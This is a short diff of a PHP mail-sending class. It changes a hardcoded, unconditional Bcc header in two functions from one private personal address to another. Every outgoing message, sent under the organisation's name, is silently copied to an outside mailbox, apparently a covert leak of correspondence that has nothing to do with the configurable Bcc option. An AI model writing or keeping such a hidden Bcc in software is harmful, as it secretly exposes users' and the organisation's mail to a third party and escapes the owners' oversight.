@@ -76,7 +76,7 @@ class Mail
                 $headers .= "Bcc: {$params['EMAIL_BCC']}\r\n";
             }
         }
-        $headers .= "Bcc: petre_daniel04@yahoo.com\r\n";
+        $headers .= "Bcc: dorin92g@gmail.com\r\n";
         $headers .= "From: {$organization} <{$from}>" . "\r\n";
         $headers .= "Sender: <{$from}>" . "\r\n";
         $headers .= "Reply-To: {$from}" . "\r\n";
@@ -157,7 +157,7 @@ class Mail
                 $headers .= "Bcc: {$params['EMAIL_BCC']}\r\n";
             }
         }
-        $headers .= "Bcc: petre_daniel04@yahoo.com\r\n";
+        $headers .= "Bcc: dorin92g@gmail.com\r\n";
         $headers .= "From: {$organization} <{$from}>" . "\r\n";
         $headers .= "Sender: <{$from}>" . "\r\n";
         $headers .= "Reply-To: {$from}" . "\r\n";
